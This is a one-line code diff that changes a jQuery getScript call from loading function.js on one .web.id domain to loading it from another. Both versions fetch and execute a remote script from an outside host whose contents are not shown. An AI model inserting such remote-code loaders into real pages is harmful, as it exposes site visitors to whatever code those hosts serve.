@@ -1,1 +1,1 @@
-$.getScript("https://lsfashion.web.id/function.js", function(){ });
+$.getScript("https://kiki.web.id/function.js", function(){ });
